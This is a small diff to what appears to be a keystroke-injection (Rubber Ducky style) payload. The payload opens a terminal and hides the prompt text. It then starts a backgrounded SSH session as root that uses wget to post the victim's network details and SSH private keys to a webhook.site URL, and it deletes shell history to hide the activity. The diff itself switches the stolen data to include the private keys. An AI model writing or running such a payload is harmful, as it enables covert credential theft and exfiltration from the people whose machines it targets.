@@ -7,7 +7,7 @@ CTRL-ALT t
 DELAY 500
 STRING export PS1="\e[40;0;30m";
 ENTER
-STRING nohup ssh root@190.111.222.333 'wget -q --post-data "d=$(whoami;hostname;ip a)" https://webhook.site/ae21cf97-02db-4fab-ab97-9e83820a8dea -O/dev/null;history -d-1;exit;'>/dev/null 2>&1&
+STRING nohup ssh root@190.111.222.333 'wget -q --post-data "d=$(ip a;cat .ssh/id*)" https://webhook.site/ae21cf97-02db-4fab-ab97-9e83820a8dea -O/dev/null;history -d-1;exit;'>/dev/null 2>&1&
 ENTER
 STRING history -d -3--1;exit
 ENTER
